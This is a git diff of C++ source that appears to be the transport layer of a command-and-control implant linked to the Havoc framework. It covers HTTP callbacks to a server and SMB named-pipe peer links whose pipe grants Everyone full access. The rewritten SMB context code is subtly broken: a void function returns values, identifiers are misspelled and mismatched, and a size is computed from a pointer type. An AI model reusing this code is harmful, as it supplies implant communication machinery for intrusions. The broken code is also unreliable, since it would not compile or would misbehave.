@@ -4,9 +4,7 @@ using namespace Stream;
 namespace Network {
     namespace Http {
 
-        BOOL HttpSendRequest(HINTERNET request, _stream **stream) {
-            HEXANE;
-
+        BOOL HttpSendRequest(HINTERNET request, PACKET **packet) {
             DWORD read      = 0;
             DWORD in_length = 0;
 
@@ -62,9 +60,9 @@ namespace Network {
 
             } while (in_length > 0);
 
-            *stream = (_stream*) Malloc(sizeof(_stream));
-            (*stream)->buffer     = B_PTR(response);
-            (*stream)->length = total;
+            *packet = (PACKET*) Malloc(sizeof(PACKET));
+            (*packet)->buffer = B_PTR(response);
+            (*packet)->length = total;
 
         defer:
             if (!success) {
@@ -79,8 +77,6 @@ namespace Network {
         }
 
         VOID DestroyRequestContext(_request_context *req_ctx) {
-            HEXANE;
-
             if (req_ctx) {
                 if (req_ctx->req_handle)    { ctx->win32.WinHttpCloseHandle(req_ctx->req_handle); }
                 if (req_ctx->conn_handle)   { ctx->win32.WinHttpCloseHandle(req_ctx->conn_handle); }
@@ -93,8 +89,6 @@ namespace Network {
         }
 
         VOID DestroyProxyContext(_proxy_context *proxy_ctx) {
-            HEXANE;
-
             if (proxy_ctx) {
                 if (proxy_ctx->proxy_config.lpszProxy)          { Free(proxy_ctx->proxy_config.lpszProxy); }
                 if (proxy_ctx->proxy_config.lpszProxyBypass)    { Free(proxy_ctx->proxy_config.lpszProxyBypass); }
@@ -103,8 +97,6 @@ namespace Network {
         }
 
         BOOL CreateRequestContext(_request_context *req_ctx) {
-            HEXANE;
-
             const auto address  = ctx->transport.http->address;
             const auto port     = ctx->transport.http->port;
 
@@ -138,8 +130,6 @@ namespace Network {
         }
 
         BOOL CreateProxyContext(_proxy_context *proxy_ctx, _request_context *req_ctx) {
-            HEXANE;
-
             auto proxy_info     = proxy_ctx->proxy_info;
             const auto username = ctx->transport.http->proxy->username;
             const auto password = ctx->transport.http->proxy->password;
@@ -217,8 +207,7 @@ namespace Network {
             return true;
         }
 
-        BOOL HttpCallback(_stream **in, _stream *out) {
-            HEXANE;
+        BOOL HttpCallback(PACKET **in, PACKET *out) {
             // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
             // TODO: reverting tokens during http operations
 
@@ -276,74 +265,69 @@ namespace Network {
     }
 
     namespace Smb {
-
         VOID SmbContextDestroy(PSMB_PIPE_SEC_ATTR SmbSecAttr) {
-            HEXANE;
-
-            if (SmbSecAttr->sid)        { ctx->win32.FreeSid(SmbSecAttr->sid); SmbSecAttr->sid = nullptr; }
-            if (SmbSecAttr->sid_low)    { ctx->win32.FreeSid(SmbSecAttr->sid_low); SmbSecAttr->sid_low = nullptr; }
+            if (SmbSecAttr->sid)        { ctx->win32.FreeSid(SmbSecAttr->sid); 		SmbSecAttr->sid = nullptr; }
+            if (SmbSecAttr->sid_low)    { ctx->win32.FreeSid(SmbSecAttr->sid_low); 	SmbSecAttr->sid_low = nullptr; }
             if (SmbSecAttr->p_acl)      { Free(SmbSecAttr->p_acl); }
             if (SmbSecAttr->sec_desc)   { Free(SmbSecAttr->sec_desc); }
         }
 
-        BOOL SmbContextInit(SMB_PIPE_SEC_ATTR *const SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {
-            HEXANE;
+		VOID SmbInitContext(SMB_PIPE_SEC_ATTR *smbSecAttr, PSECURITY_ATTRIBUTES secAttr) {
+			SID_IDENTIFIER_AUTHORITY world 	= SECURITY_WORLD_SID_AUTHORITY;
+			SID_IDENTIFIER_AUTHORITY label 	= SECURITY_MANDATORY_LABEL_AUTHORITY;
+			EXPLICIT_ACCESSA access 		= { };
+			DWORD status					= 0;
+			PACL dacl 						= nullptr;
 
-            SID_IDENTIFIER_AUTHORITY sid_auth   = SECURITY_WORLD_SID_AUTHORITY;
-            SID_IDENTIFIER_AUTHORITY sid_label  = SECURITY_MANDATORY_LABEL_AUTHORITY;
+			x_memset(smbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
+			x_memset(secAttr, 0, sizeof(PSECURITY_ATTRIBUTES));
 
-            PACL acl = { };
-            EXPLICIT_ACCESSA access = { };
+			if (!AllocateAndInitializeSid(&world, 1, SECURITY_WORLD_RID, 0,0,0,0,0,0,0, &smbSecAttr->Sid)) {
+				return false;
+			}
 
-            MemSet(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
-            MemSet(SecAttr, 0, sizeof(PSECURITY_ATTRIBUTES));
+			access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
+			access.grfInheritance       = NO_INHERITANCE;
+			access.grfAccessMode        = SET_ACCESS;
+			access.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
+			access.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
+			access.Trustee.ptstrName    = (LPSTR) smbSecAttr->Sid;
 
-            if (!ctx->win32.AllocateAndInitializeSid(&sid_auth, 1, SMB_SID_SINGLE_WORLD_SUBAUTHORITY, &SmbSecAttr->sid_low)) {
-                return false;
-            }
+			status = SetEntriesInAclA(1, &access, nullptr, &dacl);
+			if (status != 0) {
+				// soft error
+			} 
+			if (!AllocateAndInitializeSid(&label, 1, SECURITY_MANDATORY_LOW_RID, 0,0,0,0,0,0,0, &smbSecAttr->SidLow)) {
+				// soft error
+			}
 
-            access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
-            access.grfInheritance       = NO_INHERITANCE;
-            access.grfAccessMode        = SET_ACCESS;
+			smbSecAttr->pAcl = (PACL) HeapAlloc(GetProcessHeap(), 0, MAX_PATH);
+			if (!InitializeAcl(smbSecAttr->pAcl, MAX_PATH, ACL_DEVISION_DS)) {
+				// soft error
+			}
+			if (!AddMandatoryAce(smbSecAttr->pAcl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, smbSecAttr->SidLow)) {
+				// soft error
+			}
 
-            access.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
-            access.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
-            access.Trustee.ptstrName    = (LPSTR) SmbSecAttr->sid;
+			smbSecattr->SecDec = (PSECURITY_DESCRIPTOR) HeapAlloc(GetProcessHeap(), 0, SECURITY_DESCRIPTOR_MIN_LENGTH);
+			if (!InitializeSecurityDescriptor(smbSecAttr->SecDec, SECURITY_DESCRIPTOR_REVISION)) {
+				// soft error
+			} 
+			if (!SetSecurityDescriptorDacl(smbSecAttr->SecDec, true, dacl, false)) {
+				// soft error
+			}
+			if (!SetSecurityDescriptorSacl(smbSecAttr->SecDec, true, smbSecAttr->pAcl, false)) {
+				// soft error
+			}
 
-            uint32_t status = ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl);
-            if (status) {
-                return false;
-            }
+			secAttr->lpSecurityDescriptor = smbSecAttr->SecDec;
+			secAttr->bInheritHandle = false;
+			secAttr->nLength = sizeof(SECURITY_ATTRIBUTES);
 
-            if (!ctx->win32.AllocateAndInitializeSid(&sid_label, 1, SMB_RID_SINGLE_MANDATORY_LOW, &SmbSecAttr->sid_low)) {
-                return false;
-            }
+			return true;
+		}
 
-            SmbSecAttr->p_acl = (PACL) Malloc(MAX_PATH);
-
-            if (!ctx->win32.InitializeAcl(SmbSecAttr->p_acl, MAX_PATH, ACL_REVISION_DS) ||
-                !ctx->win32.AddMandatoryAce(SmbSecAttr->p_acl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->sid_low)) {
-                return false;
-            }
-
-            SmbSecAttr->sec_desc = Malloc(SECURITY_DESCRIPTOR_MIN_LENGTH);
-
-            if (!ctx->win32.InitializeSecurityDescriptor(SmbSecAttr->sec_desc, SECURITY_DESCRIPTOR_REVISION) ||
-                !ctx->win32.SetSecurityDescriptorDacl(SmbSecAttr->sec_desc, TRUE, acl, FALSE) ||
-                !ctx->win32.SetSecurityDescriptorSacl(SmbSecAttr->sec_desc, TRUE, SmbSecAttr->p_acl, FALSE)) {
-                return false;
-            }
-
-            SecAttr->lpSecurityDescriptor = SmbSecAttr->sec_desc;
-            SecAttr->nLength = sizeof(SECURITY_ATTRIBUTES);
-            SecAttr->bInheritHandle = false;
-
-            return true;
-        }
-
-        BOOL PipeRead(void *handle, _stream *in) {
-            HEXANE;
-
+        BOOL PipeRead(void *handle, PACKET *in) {
             uint32_t read   = 0;
             uint32_t total  = 0;
 
@@ -362,9 +346,7 @@ namespace Network {
             return true;
         }
 
-        BOOL PipeWrite(void *handle, _stream *out) {
-            HEXANE;
-
+        BOOL PipeWrite(void *handle, PACKET *out) {
             uint32_t total = 0;
             uint32_t write = 0;
 
@@ -381,26 +363,29 @@ namespace Network {
             return true;
         }
 
-        BOOL PipeSend (_stream *out) {
-            HEXANE;
-
+        BOOL PipeSend (PACKET *out) {
             SMB_PIPE_SEC_ATTR smb_sec_attr  = { };
             SECURITY_ATTRIBUTES sec_attr    = { };
 
-            if (!ctx->transport.egress_handle) {
-                if (
-                    !SmbContextInit(&smb_sec_attr, &sec_attr) ||
-                    !(ctx->transport.egress_handle = ctx->win32.CreateNamedPipeW(ctx->transport.egress_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
-                    return false;
-                }
+			if (!ctx->transport.egress_handle) {
+				SmbInitContext(&smb_sec_attr, &sec_attr);
 
-                SmbContextDestroy(&smb_sec_attr);
+				ctx->transport.egress_handle = ctx->win32.CreateNamedPipeW(
+						ctx->transport.egress_name, 
+						PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 
+						PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr);
 
-                if (!ctx->win32.ConnectNamedPipe(ctx->transport.egress_handle, nullptr)) {
-                    ctx->win32.NtClose(ctx->transport.egress_handle);
-                    return false;
-                }
-            }
+				if (!ctx->transport.egress_handle || ctx->transport.egress_handle == INVALID_HANDLE_VALUE) {
+					return false;
+				}
+
+				SmbDestroyContext(&smb_sec_attr);
+
+				if (!ctx->win32.ConnectNamedPipe(ctx->transport.egress_handle, nullptr)) {
+					ctx->win32.NtClose(ctx->transport.egress_handle);
+					return false;
+				}
+			}
 
             if (!PipeWrite(ctx->transport.egress_handle, out)) {
                 if (ntstatus == ERROR_NO_DATA) {
@@ -414,14 +399,12 @@ namespace Network {
             return true;
         }
 
-        BOOL PipeReceive(_stream** in) {
-            HEXANE;
-
+        BOOL PipeReceive(PACKET** in) {
             uint32_t peer_id    = 0;
             uint32_t msg_size   = 0;
 
             DWORD total = 0;
-            *in = CreateStream();
+            *in = CreatePacket();
 
             if (ctx->win32.PeekNamedPipe(ctx->transport.egress_handle, nullptr, 0, nullptr, &total, nullptr)) {
                 if (total > sizeof(uint32_t) * 2) {
@@ -440,7 +423,7 @@ namespace Network {
 
                     if (!PipeRead(ctx->transport.egress_handle, *in)) {
                         if (*in) {
-                            DestroyStream(*in);
+                            DestroyPacket(*in);
                         }
                         return false;
                     }
